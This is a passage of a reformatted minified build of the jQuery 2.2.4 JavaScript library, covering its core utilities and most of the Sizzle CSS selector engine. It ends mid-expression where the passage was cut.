!function (e, t) {
    "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function (e) {
        if (!e.document) throw new Error("jQuery requires a window with a document");
        return t(e)
    } : t(e)
}("undefined" != typeof window ? window : this, (function (e, t) {
    function n(e, t) {
        return t.toUpperCase()
    }

    var i = [], r = e.document, a = i.slice, s = i.concat, o = i.push, l = i.indexOf, c = {}, u = c.toString,
        d = c.hasOwnProperty, p = {}, h = "2.2.4", f = function (e, t) {
            return new f.fn.init(e, t)
        }, m = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, v = /^-ms-/, g = /-([\da-z])/gi;

    function y(e) {
        var t = !!e && "length" in e && e.length, n = f.type(e);
        return "function" !== n && !f.isWindow(e) && ("array" === n || 0 === t || "number" == typeof t && 0 < t && t - 1 in e)
    }

    f.fn = f.prototype = {
        jquery: h, constructor: f, selector: "", length: 0, toArray: function () {
            return a.call(this)
        }, get: function (e) {
            return null != e ? e < 0 ? this[e + this.length] : this[e] : a.call(this)
        }, pushStack: function (e) {
            return (e = f.merge(this.constructor(), e)).prevObject = this, e.context = this.context, e
        }, each: function (e) {
            return f.each(this, e)
        }, map: function (e) {
            return this.pushStack(f.map(this, (function (t, n) {
                return e.call(t, n, t)
            })))
        }, slice: function () {
            return this.pushStack(a.apply(this, arguments))
        }, first: function () {
            return this.eq(0)
        }, last: function () {
            return this.eq(-1)
        }, eq: function (e) {
            var t = this.length;
            e = +e + (e < 0 ? t : 0);
            return this.pushStack(0 <= e && e < t ? [this[e]] : [])
        }, end: function () {
            return this.prevObject || this.constructor()
        }, push: o, sort: i.sort, splice: i.splice
    }, f.extend = f.fn.extend = function () {
        var e, t, n, i, r, a = arguments[0] || {}, s = 1, o = arguments.length, l = !1;
        for ("boolean" == typeof a && (l = a, a = arguments[s] || {}, s++), "object" == typeof a || f.isFunction(a) || (a = {}), s === o && (a = this, s--); s < o; s++) if (null != (e = arguments[s])) for (t in e) r = a[t], a !== (n = e[t]) && (l && n && (f.isPlainObject(n) || (i = f.isArray(n))) ? (r = i ? (i = !1, r && f.isArray(r) ? r : []) : r && f.isPlainObject(r) ? r : {}, a[t] = f.extend(l, r, n)) : void 0 !== n && (a[t] = n));
        return a
    }, f.extend({
        expando: "jQuery" + (h + Math.random()).replace(/\D/g, ""), isReady: !0, error: function (e) {
            throw new Error(e)
        }, noop: function () {
        }, isFunction: function (e) {
            return "function" === f.type(e)
        }, isArray: Array.isArray, isWindow: function (e) {
            return null != e && e === e.window
        }, isNumeric: function (e) {
            var t = e && e.toString();
            return !f.isArray(e) && 0 <= t - parseFloat(t) + 1
        }, isPlainObject: function (e) {
            if ("object" !== f.type(e) || e.nodeType || f.isWindow(e)) return !1;
            if (e.constructor && !d.call(e, "constructor") && !d.call(e.constructor.prototype || {}, "isPrototypeOf")) return !1;
            for (var t in e) ;
            return void 0 === t || d.call(e, t)
        }, isEmptyObject: function (e) {
            for (var t in e) return !1;
            return !0
        }, type: function (e) {
            return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? c[u.call(e)] || "object" : typeof e
        }, globalEval: function (e) {
            var t, n = eval;
            (e = f.trim(e)) && (1 === e.indexOf("use strict") ? ((t = r.createElement("script")).text = e, r.head.appendChild(t).parentNode.removeChild(t)) : n(e))
        }, camelCase: function (e) {
            return e.replace(v, "ms-").replace(g, n)
        }, nodeName: function (e, t) {
            return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
        }, each: function (e, t) {
            var n, i = 0;
            if (y(e)) for (n = e.length; i < n && !1 !== t.call(e[i], i, e[i]); i++) ; else for (i in e) if (!1 === t.call(e[i], i, e[i])) break;
            return e
        }, trim: function (e) {
            return null == e ? "" : (e + "").replace(m, "")
        }, makeArray: function (e, t) {
            return t = t || [], null != e && (y(Object(e)) ? f.merge(t, "string" == typeof e ? [e] : e) : o.call(t, e)), t
        }, inArray: function (e, t, n) {
            return null == t ? -1 : l.call(t, e, n)
        }, merge: function (e, t) {
            for (var n = +t.length, i = 0, r = e.length; i < n; i++) e[r++] = t[i];
            return e.length = r, e
        }, grep: function (e, t, n) {
            for (var i = [], r = 0, a = e.length, s = !n; r < a; r++) !t(e[r], r) != s && i.push(e[r]);
            return i
        }, map: function (e, t, n) {
            var i, r, a = 0, o = [];
            if (y(e)) for (i = e.length; a < i; a++) null != (r = t(e[a], a, n)) && o.push(r); else for (a in e) null != (r = t(e[a], a, n)) && o.push(r);
            return s.apply([], o)
        }, guid: 1, proxy: function (e, t) {
            var n, i;
            if ("string" == typeof t && (i = e[t], t = e, e = i), f.isFunction(e)) return n = a.call(arguments, 2), (i = function () {
                return e.apply(t || this, n.concat(a.call(arguments)))
            }).guid = e.guid = e.guid || f.guid++, i
        }, now: Date.now, support: p
    }), "function" == typeof Symbol && (f.fn[Symbol.iterator] = i[Symbol.iterator]), f.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), (function (e, t) {
        c["[object " + t + "]"] = t.toLowerCase()
    }));
    var b = function (e) {
        function t(e, t, n) {
            var i = "0x" + t - 65536;
            return i != i || n ? t : i < 0 ? String.fromCharCode(65536 + i) : String.fromCharCode(i >> 10 | 55296, 1023 & i | 56320)
        }

        function n() {
            f()
        }

        var i, r, a, s, o, l, c, u, d, p, h, f, m, v, g, y, b, x, w, S = "sizzle" + +new Date, E = e.document, C = 0,
            T = 0, k = re(), P = re(), M = re(), L = function (e, t) {
                return e === t && (h = !0), 0
            }, I = {}.hasOwnProperty, A = [], D = A.pop, N = A.push, $ = A.push, O = A.slice, _ = function (e, t) {
                for (var n = 0, i = e.length; n < i; n++) if (e[n] === t) return n;
                return -1
            },
            H = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            z = "[\\x20\\t\\r\\n\\f]", B = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
            F = "\\[" + z + "*(" + B + ")(?:" + z + "*([*^$|!~]?=)" + z + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + B + "))|)" + z + "*\\]",
            R = ":(" + B + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + F + ")*)|.*)\\)|)",
            j = new RegExp(z + "+", "g"), q = new RegExp("^" + z + "+|((?:^|[^\\\\])(?:\\\\.)*)" + z + "+$", "g"),
            V = new RegExp("^" + z + "*," + z + "*"), G = new RegExp("^" + z + "*([>+~]|" + z + ")" + z + "*"),
            X = new RegExp("=" + z + "*([^\\]'\"]*?)" + z + "*\\]", "g"), W = new RegExp(R),
            Y = new RegExp("^" + B + "$"), U = {
                ID: new RegExp("^#(" + B + ")"),
                CLASS: new RegExp("^\\.(" + B + ")"),
                TAG: new RegExp("^(" + B + "|[*])"),
                ATTR: new RegExp("^" + F),
                PSEUDO: new RegExp("^" + R),
                CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + z + "*(even|odd|(([+-]|)(\\d*)n|)" + z + "*(?:([+-]|)" + z + "*(\\d+)|))" + z + "*\\)|)", "i"),
                bool: new RegExp("^(?:" + H + ")$", "i"),
                needsContext: new RegExp("^" + z + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + z + "*((?:-\\d)?\\d*)" + z + "*\\)|)(?=[^-]|$)", "i")
            }, K = /^(?:input|select|textarea|button)$/i, Q = /^h\d$/i, J = /^[^{]+\{\s*\[native \w/,
            Z = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/, ee = /[+~]/, te = /'|\\/g,
            ne = new RegExp("\\\\([\\da-f]{1,6}" + z + "?|(" + z + ")|.)", "ig");
        try {
            $.apply(A = O.call(E.childNodes), E.childNodes), A[E.childNodes.length].nodeType
        } catch (i) {
            $ = {
                apply: A.length ? function (e, t) {
                    N.apply(e, O.call(t))
                } : function (e, t) {
                    for (var n = e.length, i = 0; e[n++] = t[i++];) ;
                    e.length = n - 1
                }
            }
        }

        function ie(e, t, n, i) {
            var a, s, o, c, d, p, h, v, b = t && t.ownerDocument, x = t ? t.nodeType : 9;
            if (n = n || [], "string" != typeof e || !e || 1 !== x && 9 !== x && 11 !== x) return n;
            if (!i && ((t ? t.ownerDocument || t : E) !== m && f(t), t = t || m, g)) {
                if (11 !== x && (p = Z.exec(e))) if (a = p[1]) {
                    if (9 === x) {
                        if (!(o = t.getElementById(a))) return n;
                        if (o.id === a) return n.push(o), n
                    } else if (b && (o = b.getElementById(a)) && w(t, o) && o.id === a) return n.push(o), n
                } else {
                    if (p[2]) return $.apply(n, t.getElementsByTagName(e)), n;
                    if ((a = p[3]) && r.getElementsByClassName && t.getElementsByClassName) return $.apply(n, t.getElementsByClassName(a)), n
                }
                if (r.qsa && !M[e + " "] && (!y || !y.test(e))) {
                    if (1 !== x) b = t, v = e; else if ("object" !== t.nodeName.toLowerCase()) {
                        for ((c = t.getAttribute("id")) ? c = c.replace(te, "\\$&") : t.setAttribute("id", c = S), s = (h = l(e)).length, d = Y.test(c) ? "#" + c : "[id='" + c + "']"; s--;) h[s] = d + " " + pe(h[s]);
                        v = h.join(","), b = ee.test(e) && ue(t.parentNode) || t
                    }
                    if (v) try {
                        return $.apply(n, b.querySelectorAll(v)), n
                    } catch (e) {
                    } finally {
                        c === S && t.removeAttribute("id")
                    }
                }
            }
            return u(e.replace(q, "$1"), t, n, i)
        }

        function re() {
            var e = [];
            return function t(n, i) {
                return e.push(n + " ") > a.cacheLength && delete t[e.shift()], t[n + " "] = i
            }
        }

        function ae(e) {
            return e[S] = !0, e
        }

        function se(e) {
            var t = m.createElement("div");
            try {
                return !!e(t)
            } catch (e) {
                return !1
            } finally {
                t.parentNode && t.parentNode.removeChild(t)
            }
        }

        function oe(e, t) {
            for (var n = e.split("|"), i = n.length; i--;) a.attrHandle[n[i]] = t
        }

        function le(e, t) {
            var n = t && e,
                i = n && 1 === e.nodeType && 1 === t.nodeType && (~t.sourceIndex || 1 << 31) - (~e.sourceIndex || 1 << 31);
            if (i) return i;
            if (n) for (; n = n.nextSibling;) if (n === t) return -1;
            return e ? 1 : -1
        }

        function ce(e) {
            return ae((function (t) {
                return t = +t, ae((function (n, i) {
                    for (var r, a = e([], n.length, t), s = a.length; s--;) n[r = a[s]] && (n[r] = !(i[r] = n[r]))
                }))
            }))
        }

        function ue(e) {
            return e && void 0 !== e.getElementsByTagName && e
        }

        for (i in r = ie.support = {}, o = ie.isXML = function (e) {
            return !!(e = e && (e.ownerDocument || e).documentElement) && "HTML" !== e.nodeName
        }, f = ie.setDocument = function (e) {
            return (e = e ? e.ownerDocument || e : E) !== m && 9 === e.nodeType && e.documentElement && (v = (m = e).documentElement, g = !o(m), (e = m.defaultView) && e.top !== e && (e.addEventListener ? e.addEventListener("unload", n, !1) : e.attachEvent && e.attachEvent("onunload", n)), r.attributes = se((function (e) {
                return e.className = "i", !e.getAttribute("className")
            })), r.getElementsByTagName = se((function (e) {
                return e.appendChild(m.createComment("")), !e.getElementsByTagName("*").length
            })), r.getElementsByClassName = J.test(m.getElementsByClassName), r.getById = se((function (e) {
                return v.appendChild(e).id = S, !m.getElementsByName || !m.getElementsByName(S).length
            })), r.getById ? (a.find.ID = function (e, t) {
                if (void 0 !== t.getElementById && g) return (e = t.getElementById(e)) ? [e] : []
            }, a.filter.ID = function (e) {
                var n = e.replace(ne, t);
                return function (e) {
                    return e.getAttribute("id") === n
                }
            }) : (delete a.find.ID, a.filter.ID = function (e) {
                var n = e.replace(ne, t);
                return function (e) {
                    return (e = void 0 !== e.getAttributeNode && e.getAttributeNode("id")) && e.value === n
                }
            }), a.find.TAG = r.getElementsByTagName ? function (e, t) {
                return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : r.qsa ? t.querySelectorAll(e) : void 0
            } : function (e, t) {
                var n, i = [], r = 0, a = t.getElementsByTagName(e);
                if ("*" !== e) return a;
                for (; n = a[r++];) 1 === n.nodeType && i.push(n);
                return i
            }, a.find.CLASS = r.getElementsByClassName && function (e, t) {
                if (void 0 !== t.getElementsByClassName && g) return t.getElementsByClassName(e)
            }, b = [], y = [], (r.qsa = J.test(m.querySelectorAll)) && (se((function (e) {
                v.appendChild(e).innerHTML = "<a id='" + S + "'></a><select id='" + S + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && y.push("[*^$]=" + z + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || y.push("\\[" + z + "*(?:value|" + H + ")"), e.querySelectorAll("[id~=" + S + "-]").length || y.push("~="), e.querySelectorAll(":checked").length || y.push(":checked"), e.querySelectorAll("a#" + S + "+*").length || y.push(".#.+[+~]")
            })), se((function (e) {
                var t = m.createElement("input");
                t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && y.push("name" + z + "*[*^$|!~]?="), e.querySelectorAll(":enabled").length || y.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), y.push(",.*:")
            }))), (r.matchesSelector = J.test(x = v.matches || v.webkitMatchesSelector || v.mozMatchesSelector || v.oMatchesSelector || v.msMatchesSelector)) && se((function (e) {
                r.disconnectedMatch = x.call(e, "div"), x.call(e, "[s!='']:x"), b.push("!=", R)
            })), y = y.length && new RegExp(y.join("|")), b = b.length && new RegExp(b.join("|")), e = J.test(v.compareDocumentPosition), w = e || J.test(v.contains) ? function (e, t) {
                var n = 9 === e.nodeType ? e.documentElement : e;
                return e === (t = t && t.parentNode) || !(!t || 1 !== t.nodeType || !(n.contains ? n.contains(t) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(t)))
            } : function (e, t) {
                if (t) for (; t = t.parentNode;) if (t === e) return !0;
                return !1
            }, L = e ? function (e, t) {
                if (e === t) return h = !0, 0;
                var n = !e.compareDocumentPosition - !t.compareDocumentPosition;
                return n || (1 & (n = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !r.sortDetached && t.compareDocumentPosition(e) === n ? e === m || e.ownerDocument === E && w(E, e) ? -1 : t === m || t.ownerDocument === E && w(E, t) ? 1 : p ? _(p, e) - _(p, t) : 0 : 4 & n ? -1 : 1)
            } : function (e, t) {
                if (e === t) return h = !0, 0;
                var n, i = 0, r = e.parentNode, a = t.parentNode, s = [e], o = [t];
                if (!r || !a) return e === m ? -1 : t === m ? 1 : r ? -1 : a ? 1 : p ? _(p, e) - _(p, t) : 0;
                if (r === a) return le(e, t);
                for (n = e; n = n.parentNode;) s.unshift(n);
                for (n = t; n = n.parentNode;) o.unshift(n);
                for (; s[i] === o[i];) i++;
                return i ? le(s[i], o[i]) : s[i] === E ? -1 : o[i] === E ? 1 : 0
            }), m
        }, ie.matches = function (e, t) {
            return ie(e, null, null, t)
        }, ie.matchesSelector = function (e, t) {
            if ((e.ownerDocument || e) !== m && f(e), t = t.replace(X, "='$1']"), r.matchesSelector && g && !M[t + " "] && (!b || !b.test(t)) && (!y || !y.test(t))) try {
                var n = x.call(e, t);
                if (n || r.disconnectedMatch || e.document && 11 !== e.document.nodeType) return n
            } catch (e) {
            }
            return 0 < ie(t, m, null, [e]).length
        }, ie.contains = function (e, t) {
            return (e.ownerDocument || e) !== m && f(e), w(e, t)
        }, ie.attr = function (e, t) {
            var n;
            return (e.ownerDocument || e) !== m && f(e), void 0 !== (n = (n = a.attrHandle[t.toLowerCase()]) && I.call(a.attrHandle, t.toLowerCase()) ? n(e, t, !g) : void 0) ? n : r.attributes || !g ? e.getAttribute(t) : (n = e.getAttributeNode(t)) && n.specified ? n.value : null
        }, ie.error = function (e) {
            throw new Error("Syntax error, unrecognized expression: " + e)
        }, ie.uniqueSort = function (e) {
            var t, n = [], i = 0, a = 0;
            if (h = !r.detectDuplicates, p = !r.sortStable && e.slice(0), e.sort(L), h) {
                for (; t = e[a++];) t === e[a] && (i = n.push(a));
                for (; i--;) e.splice(n[i], 1)
            }
            return p = null, e
        }, s = ie.getText = function (e) {
            var t, n = "", i = 0, r = e.nodeType;
            if (r) {
                if (1 === r || 9 === r || 11 === r) {
                    if ("string" == typeof e.textContent) return e.textContent;
                    for (e = e.firstChild; e; e = e.nextSibling) n += s(e)
                } else if (3 === r || 4 === r) return e.nodeValue
            } else for (; t = e[i++];) n += s(t);
            return n
        }, (a = ie.selectors = {
            cacheLength: 50,
            createPseudo: ae,
            match: U,
            attrHandle: {},
            find: {},
            relative: {
                ">": {dir: "parentNode", first: !0},
                " ": {dir: "parentNode"},
                "+": {dir: "previousSibling", first: !0},
                "~": {dir: "previousSibling"}
            },
            preFilter: {
                ATTR: function (e) {
                    return e[1] = e[1].replace(ne, t), e[3] = (e[3] || e[4] || e[5] || "").replace(ne, t), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                }, CHILD: function (e) {
                    return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || ie.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && ie.error(e[0]), e
                }, PSEUDO: function (e) {
                    var t, n = !e[6] && e[2];
                    return U.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && W.test(n) && (t = l(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3))
                }
            },
            filter: {
                TAG: function (e) {
                    var n = e.replace(ne, t).toLowerCase();
                    return "*" === e ? function () {
                        return !0
                    } : function (e) {
                        return e.nodeName && e.nodeName.toLowerCase() === n
                    }
                }, CLASS: function (e) {
                    var t = k[e + " "];
                    return t || (t = new RegExp("(^|" + z + ")" + e + "(" + z + "|$)")) && k(e, (function (e) {
                        return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "")
                    }))
                }, ATTR: function (e, t, n) {
                    return function (i) {
                        return null == (i = ie.attr(i, e)) ? "!=" === t : !t || (i += "", "=" === t ? i === n : "!=" === t ? i !== n : "^=" === t ? n && 0 === i.indexOf(n) : "*=" === t ? n && -1 < i.indexOf(n) : "$=" === t ? n && i.slice(-n.length) === n : "~=" === t ? -1 < (" " + i.replace(j, " ") + " ").indexOf(n) : "|=" === t && (i === n || i.slice(0, n.length + 1) === n + "-"))
                    }
                }, CHILD: function (e, t, n, i, r) {
                    var a = "nth" !== e.slice(0, 3), s = "last" !== e.slice(-4), o = "of-type" === t;
                    return 1 === i && 0 === r ? function (e) {
                        return !!e.parentNode
                    } : function (t, n, l) {
                        var c, u, d, p, h, f, m = a != s ? "nextSibling" : "previousSibling", v = t.parentNode,
                            g = o && t.nodeName.toLowerCase(), y = !l && !o, b = !1;
                        if (v) {
                            if (a) {
                                for (; m;) {
                                    for (p = t; p = p[m];) if (o ? p.nodeName.toLowerCase() === g : 1 === p.nodeType) return !1;
                                    f = m = "only" === e && !f && "nextSibling"
                                }
                                return !0
                            }
                            if (f = [s ? v.firstChild : v.lastChild], s && y) {
                                for (b = (h = (c = (u = (d = (p = v)[S] || (p[S] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] || [])[0] === C && c[1]) && c[2], p = h && v.childNodes[h]; p = ++h && p && p[m] || (b = h = 0) || f.pop();) if (1 === p.nodeType && ++b && p === t) {
                                    u[e] = [C, h, b];
                                    break
                                }
                            } else if (!1 === (b = y ? h = (c = (u = (d = (p = t)[S] || (p[S] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] || [])[0] === C && c[1] : b)) for (; (p = ++h && p && p[m] || (b = h = 0) || f.pop()) && ((o ? p.nodeName.toLowerCase() !== g : 1 !== p.nodeType) || !++b || (y && ((u = (d = p[S] || (p[S] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] = [C, b]), p !== t));) ;
                            return (b -= r) === i || b % i == 0 && 0 <= b / i
                        }
                    }
                }, PSEUDO: function (e, t) {
                    var n, i = a.pseudos[e] || a.setFilters[e.toLowerCase()] || ie.error("unsupported pseudo: " + e);
                    return i[S] ? i(t) : 1 < i.length ? (n = [e, e, "", t], a.setFilters.hasOwnProperty(e.toLowerCase()) ? ae((function (e, n) {
                        for (var r, a = i(e, t), s = a.length; s--;) e[r = _(e, a[s])] = !(n[r] = a[s])
                    })) : function (e) {
                        return i(e, 0, n)
                    }) : i
                }
            },
            pseudos: {
                not: ae((function (e) {
                    var t = [], n = [], i = c(e.replace(q, "$1"));
                    return i[S] ? ae((function (e, t, n, r) {
                        for (var a, s = i(e, null, r, []), o = e.length; o--;) (a = s[o]) && (e[o] = !(t[o] = a))
                    })) : function (e, r, a) {
                        return t[0] = e, i(t, null, a, n), t[0] = null, !n.pop()
                    }
                })), has: ae((function (e) {
                    return function (t) {
                        return 0 < ie(e, t).length
                    }
                })), contains: ae((function (e) {
                    return e = e.replace(ne, t), function (t) {
                        return -1 < (t.textContent || t.innerText || s(t)).indexOf(e)
                    }
                })), lang: ae((function (e) {
                    return Y.test(e || "") || ie.error("unsupported lang: " + e), e = e.replace(ne, t).toLowerCase(), function (t) {
                        var n;
                        do {
                            if (n = g ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-")
                        } while ((t = t.parentNode) && 1 === t.nodeType);
                        return !1
                    }
                })), target: function (t) {
                    var n = e.location && e.location.hash;
                    return n && n.slice(1) === t.id
                }, root: function (e) {
                    return e === v
                }, focus: function (e) {
                    return e === m.activeElement && (!m.hasFocus || m.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                }, enabled: function (e) {
                    return !1 === e.disabled
                }, disabled: function (e) {
                    return !0 === e.disabled
                }, checked: function (e) {
                    var t = e.nodeName.toLowerCase();
                    return "input" === t && !!e.checked || "option" === t && !!e.selected
                }, selected: function (e) {
                    return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
                }, empty: function (e) {
                    for (e = e.firstChild; e; e = e.nextSibling) if (e.nodeType < 6) return !1;
                    return !0
                }, parent: function (e) {
                    return !a.pseudos.empty(e)
                }, header: function (e) {
                    return Q.test(e.nodeName)
                }, input: function (e) {
                    return K.test(e.nodeName)
                }, button: function (e) {
                    var t = e.nodeName.toLowerCase();
                    return "input" === t && "button" === e.type || "button" === t
                }, text: function (e) {
                    return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (e = e.getAttribute("type")) || "text" === e.toLowerCase())
                }, first: ce((function () {
                    return [0]
                })), last: ce((function (e, t) {
                    return [t - 1]
                })), eq: ce((function (e, t, n) {
                    return [n < 0 ? n + t : n]
                })), even: ce((function (e, t) {
                    for (var n = 0; n < t; n += 2) e.push(n);
                    return e
                })), odd: ce((function (e, t) {
                    for (var n = 1; n < t; n += 2) e.push(n);
                    return e
                })), lt: ce((function (e, t, n) {
                    for (var i = n < 0 ? n + t : n; 0 <= --i;) e.push(i);
                    return e
                })), gt: ce((function (e, t, n) {
                    for (var i = n < 0 ? n + t : n; ++i < t;) e.push(i);
                    return e
                }))
            }
        }).pseudos.nth = a.pseudos.eq, {
            radio: !0,
            checkbox: !0,
            file: !0,
            password: !0,
            image: !0
        }) a.pseudos[i] = function (e) {
            return function (t) {
                return "input" === t.nodeName.toLowerCase() && t.type === e
            }
        }(i);
        for (i in {submit: !0, reset: !0}) a.pseudos[i] = function (e) {
            return function (t) {
                var n = t.nodeName.toLowerCase();
                return ("input" === n || "button" === n) && t.type === e
            }
        }(i);

        function de() {
        }

        function pe(e) {
            for (var t = 0, n = e.length, i = ""; t < n; t++) i += e[t].value;
            return i
        }

        function he(e, t, n) {
            var i = t.dir, r = n && "parentNode" === i, a = T++;
            return t.first ? function (t, n, a) {
                for (; t = t[i];) if (1 === t.nodeType || r) return e(t, n, a)
            } : function (t, n, s) {
                var o, l, c = [C, a];
                if (s) {
                    for (; t = t[i];) if ((1 === t.nodeType || r) && e(t, n, s)) return !0
                } else for (; t = t[i];) if (1 === t.nodeType || r) {
                    if ((l = (o = (l = t[S] || (t[S] = {}))[t.uniqueID] || (l[t.uniqueID] = {}))[i]) && l[0] === C && l[1] === a) return c[2] = l[2];
                    if ((o[i] = c)[2] = e(t, n, s)) return !0
                }
            }
        }

        function fe(e) {
            return 1 < e.length ? function (t, n, i) {
                for (var r = e.length; r--;) if (!e[r](t, n, i)) return !1;
                return !0
            } : e[0]
        }

        function me(e, t, n, i, r) {
            for (var a, s = [], o = 0, l = e.length, c = null != t; o < l; o++) (a = e[o]) && (n && !n(a, i, r) || (s.push(a), c && t.push(o)));
            return s
        }

        function ve(e, t, n, i, r, a) {
            return i && !i[S] && (i = ve(i)), r && !r[S] && (r = ve(r, a)), ae((function (a, s, o, l) {
                var c, u, d, p = [], h = [], f = s.length, m = a || function (e, t, n) {
                        for (var i = 0, r = t.length; i < r; i++) ie(e, t[i], n);
                        return n
                    }(t || "*", o.nodeType ? [o] : o, []), v = !e || !a && t ? m : me(m, p, e, o, l),
                    g = n ? r || (a ? e : f || i) ? [] : s : v;
                if (n && n(v, g, o, l), i) for (c = me(g, h), i(c, [], o, l), u = c.length; u--;) (d = c[u]) && (g[h[u]] = !(v[h[u]] = d));
                if (a) {
                    if (r || e) {
                        if (r) {
                            for (c = [], u = g.length; u--;) (d = g[u]) && c.push(v[u] = d);
                            r(null, g = [], c, l)
                        }
                        for (u = g.length; u--;) (d = g[u]) && -1 < (c = r ? _(a, d) : p[u]) && (a[c] = !(s[c] = d))
                    }
                } else g = me(g === s ? g.splice(f, g.length) : g), r ? r(null, s, g, l) : $.apply(s, g)
            }))
        }

        return de.prototype = a.filters = a.pseudos, a.setFilters = new de, l = ie.tokenize = function (e, t) {
            var n, i, r, s, o, l, c, u = P[e + " "];
            if (u) return t ? 0 : u.slice(0);
            for (o = e, l = [], c = a.preFilter; o;) {
                for (s in n && !(i = V.exec(o)) || (i && (o = o.slice(i[0].length) || o), l.push(r = [])), n = !1, (i = G.exec(o)) && (n = i.shift(), r.push({
                    value: n,
                    type: i[0].replace(q, " ")
                }), o = o.slice(n.length)), a.filter) !(i = U[s].exec(o)) || c[s] && !(i = c[s](i)) || (n = i.shift(), r.push({
                    value: n,
                    type: s,
                    matches: i
                }), o = o.slice(n.length));
                if (!n) break
            }
            return t ? o.length : o ? ie.error(e) : P(e, l).slice(0)
        }, c = ie.compile = function (e, t) {
            var n, i = [], r = [], s = M[e + " "];
            if (!s) {
                for (n = (t = t || l(e)).length; n--;) ((s = function e(t) {
                    for (var n, i, r, s = t.length, o = a.relative[t[0].type], l = o || a.relative[" "], c = o ? 1 : 0, u = he((function (e) {
                        return e === n
                    }), l, !0), p = he((function (e) {
                        return -1 < _(n, e)
                    }), l, !0), h = [function (e, t, i) {
                        return i = !o && (i || t !== d) || ((n = t).nodeType ? u : p)(e, t, i), n = null, i
                    }]; c < s; c++) if (i = a.relative[t[c].type]) h = [he(fe(h), i)]; else {
                        if ((i = a.filter[t[c].type].apply(null, t[c].matches))[S]) {
                            for (r = ++c; r < s && !a.relative[t[r].type]; r++) ;
                            return ve(1 < c && fe(h), 1 < c && pe(t.slice(0, c - 1).concat({value: " " === t[c - 2].type ? "*" : ""})).replace(q, "$1"), i, c < r && e(t.slice(c, r)), r < s && e(t = t.slice(r)), r < s && pe(t))
                        }
                        h.push(i)
                    }
                    return fe(h)
                }(t[n]))[S] ? i : r).push(s);
                (s = M(e, function (e, t) {
                    function n(n, s, o, l, c) {
                        var u, p, h, v = 0, y = "0", b = n && [], x = [], w = d, S = n || r && a.find.TAG("*", c),
                            E = C += null == w ? 1 : Math.random() || .1, T = S.length;
                        for (c && (d = s === m || s || c); y !== T && null != (u = S[y]); y++) {
                            if (r && u) {
                                for (p = 0, s || u.ownerDocument === m || (f(u), o = !g); h = e[p++];) if (h(u, s || m, o)) {
                                    l.push(u);
                                    break
                                }
                                c && (C = E)
                            }
                            i && ((u = !h && u) && v--, n && b.push(u))
                        }
                        if (v += y, i && y !== v) {
                            for (p = 0; h = t[p++];) h(b, x, s, o);
                            if (n) {
                                if (0 < v) for (; y--;) b[y] || x[y] || (x[y] = D.call(l));
                                x = me(x)
                            }
                            $.apply(l, x), c && !n && 0 < x.length && 1 < v + t.length && ie.uniqueSort(l)
                        }
                        return c && (C = E, d = w), b
                    }

                    var i = 0 < t.length, r = 0 < e.length;
                    return i ? ae(n) : n
                }(r, i))).selector = e
            }
            return s
        }, u = ie.select = function (e, n, i, s) {
            var o, u, d, p, h, f = "function" == typeof e && e, m = !s && l(e = f.selector || e);
            if (i = i || [], 1 === m.length) {
                if (2 < (u = m[0] = m[0].slice(0)).length && "ID" === (d = u[0]).type && r.getById && 9 === n.nodeType && g && a.relative[u[1].type]) {
                    if (!(n = (a.find.ID(d.matches[0].replace(ne, t), n) || [])[0])) return i;
                    f && (n = n.parentNode), e = e.slice(u.shift().value.length)
                }
                for (o = U.needsContext.test(e) ? 0 : u.length; o-- && (d = u[o], !a.relative[p = d.type]);) if ((h = a.find[p]) && (s = h(d.matches[0].replace(ne, t), ee.test(u[0].type) && ue(n.parentNode) || n))) {
                    if (u.splice(o, 1), !(e = s.length && pe(u))) return $.apply(i, s), i;
                    break
                }
            }
            return (f || c(e, m))(s, n, !g, i, !n || ee.test(e) && ue(n.parentNode) || n), i
        }, r.sortStable = S.split("").sort(L).join("") === S, r.detectDuplicates = !!h, f(), r.sortDetached = se((function (e) {
            return 1 & e.compareDocumentPosition(m.createElement("div"))
        })), se((function (e) {
            return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
        })) || oe("type|href|height|width", (function (e, t, n) {
